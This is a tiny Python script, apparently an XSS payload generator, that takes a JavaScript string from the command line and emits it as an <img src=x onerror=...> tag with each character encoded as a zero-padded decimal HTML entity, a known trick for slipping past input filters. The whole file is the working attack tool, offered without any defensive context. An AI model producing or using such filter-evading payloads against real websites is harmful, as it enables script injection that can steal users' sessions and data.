import sys

print("<img src=x onerror=\"", end="")

for x in sys.argv[1]:
    
    char_val = str(ord(x))
    padding = 7 - len(char_val)

    print(f"&#" + "0" * padding + char_val, end="", flush=True)

print("\">")